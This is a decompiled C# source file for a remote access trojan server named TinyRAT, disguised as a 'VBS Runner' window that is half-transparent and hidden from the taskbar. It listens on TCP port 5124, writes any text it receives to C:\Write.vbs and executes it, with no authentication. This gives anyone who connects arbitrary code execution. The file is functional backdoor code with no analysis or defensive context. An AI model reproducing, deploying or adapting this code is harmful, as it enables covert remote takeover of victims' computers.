using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Windows.Forms;
using Microsoft.VisualBasic;

namespace TinyRAT.Server;

public class frmHome : Form
{
	private IContainer components;

	private Socket _HostSocket;

	private IPEndPoint _IpEndPoint;

	private TcpListener _TcpListener;

	private Timer _Timer;

	[STAThread]
	public static void Main()
	{
		Application.Run((Form)(object)new frmHome());
	}

	public frmHome()
	{
		//IL_004b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0055: Expected O, but got Unknown
		((Form)this).add_Load((EventHandler)frmHome_Load);
		_IpEndPoint = new IPEndPoint(Dns.GetHostByName(Dns.GetHostName()).AddressList[0], 5124);
		_TcpListener = new TcpListener(5124);
		_Timer = new Timer();
		InitializeComponent();
	}

	protected override void Dispose(bool disposing)
	{
		if (disposing && components != null)
		{
			components.Dispose();
		}
		((Form)this).Dispose(disposing);
	}

	[DebuggerStepThrough]
	private void InitializeComponent()
	{
		Size autoScaleBaseSize = new Size(5, 13);
		((Form)this).set_AutoScaleBaseSize(autoScaleBaseSize);
		autoScaleBaseSize = new Size(130, 93);
		((Form)this).set_ClientSize(autoScaleBaseSize);
		((Form)this).set_FormBorderStyle((FormBorderStyle)5);
		((Control)this).set_Name("frmHome");
		((Form)this).set_Opacity(0.5);
		((Form)this).set_ShowInTaskbar(false);
		((Control)this).set_Text("VBS Runner - Server");
	}

	private void frmHome_Load(object sender, EventArgs e)
	{
		_TcpListener.Start();
		_Timer.add_Tick((EventHandler)CheckTcpListener);
		_Timer.set_Interval(1000);
		_Timer.Start();
	}

	private void CheckTcpListener(object sender, EventArgs e)
	{
		if (_TcpListener.Pending())
		{
			_HostSocket = _TcpListener.AcceptSocket();
			if (_HostSocket.Poll(1, SelectMode.SelectRead))
			{
				int available = _HostSocket.Available;
				byte[] array = new byte[checked(available + 1)];
				_HostSocket.Receive(array);
				string @string = Encoding.ASCII.GetString(array);
				FileSystem.FileOpen(1, "C:\\Write.vbs", (OpenMode)2, (OpenAccess)(-1), (OpenShare)(-1), -1);
				FileSystem.PrintLine(1, new object[1] { @string });
				FileSystem.FileClose(new int[1] { 1 });
				Process.Start("C:\\Write.vbs");
			}
		}
	}
}
